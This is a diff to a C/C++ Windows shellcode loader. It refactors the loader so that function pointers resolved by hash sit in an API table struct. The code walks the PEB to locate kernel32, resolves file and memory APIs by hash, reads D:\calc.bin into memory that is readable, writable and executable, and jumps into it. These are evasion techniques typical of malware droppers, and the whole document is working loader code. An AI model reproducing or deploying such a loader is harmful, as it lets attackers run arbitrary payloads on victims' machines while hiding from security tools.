@@ -3,6 +3,8 @@
 void myMain()
 {
 
+    
+
 #ifdef _WIN64 
     PPEB pPeb = (PPEB)(__readgsqword(0x60));
 #elif _WIN32 
@@ -19,32 +21,33 @@ void myMain()
 
     HMODULE kHandle = (HMODULE)(pDte->DllBase);
 
+    API_TABLE Api;
 
-    myCreateFileA fnCreateFileA = (myCreateFileA)myGetProcAddress(kHandle, Hash::CreateFileAHash);
-    myGetFileSize fnGetFileSize = (myGetFileSize)myGetProcAddress(kHandle, Hash::GetFileSizeHash);
-    myReadFile fnReadFile = (myReadFile)myGetProcAddress(kHandle, Hash::ReadFileHash);
-    myCloseHandle fnCloseHandle = (myCloseHandle)myGetProcAddress(kHandle, Hash::CloseHandleHash);
-    myVirtualAlloc fnVirtualAlloc = (myVirtualAlloc)myGetProcAddress(kHandle, Hash::VirtualAllocHash);
-    myVirtualFree fnVirtualFree = (myVirtualFree)myGetProcAddress(kHandle, Hash::VirtualFreeHash);
+    Api.fnCreateFileA= (myCreateFileA)myGetProcAddress(kHandle, Hash::CreateFileAHash);
+    Api.fnGetFileSize= (myGetFileSize)myGetProcAddress(kHandle, Hash::GetFileSizeHash);
+    Api.fnReadFile= (myReadFile)myGetProcAddress(kHandle, Hash::ReadFileHash);
+    Api.fnCloseHandle= (myCloseHandle)myGetProcAddress(kHandle, Hash::CloseHandleHash);
+    Api.fnVirtualAlloc= (myVirtualAlloc)myGetProcAddress(kHandle, Hash::VirtualAllocHash);
+    Api.fnVirtualFree= (myVirtualFree)myGetProcAddress(kHandle, Hash::VirtualFreeHash);
 
     char filePath[] = { 'D', ':', '\\', 'c', 'a', 'l', 'c', '.', 'b', 'i', 'n', 0 };
 
-    HANDLE hFile = fnCreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    DWORD fileSize = fnGetFileSize(hFile, NULL);
-    void* execMem = fnVirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    HANDLE hFile = Api.fnCreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    DWORD fileSize = Api.fnGetFileSize(hFile, NULL);
+    void* execMem = Api.fnVirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (execMem == NULL) {
-        fnCloseHandle(hFile);
+        Api.fnCloseHandle(hFile);
     }
     DWORD bytesRead;
-    if (!fnReadFile(hFile, execMem, fileSize, &bytesRead, NULL)) {
-        fnCloseHandle(hFile);
-        fnVirtualFree(execMem, 0, MEM_RELEASE);
+    if (!Api.fnReadFile(hFile, execMem, fileSize, &bytesRead, NULL)) {
+        Api.fnCloseHandle(hFile);
+        Api.fnVirtualFree(execMem, 0, MEM_RELEASE);
     }
-    fnCloseHandle(hFile);
+    Api.fnCloseHandle(hFile);
 
     ((void(*)())execMem)();
 
-    fnVirtualFree(execMem, 0, MEM_RELEASE);
+    Api.fnVirtualFree(execMem, 0, MEM_RELEASE);
 
 }
 
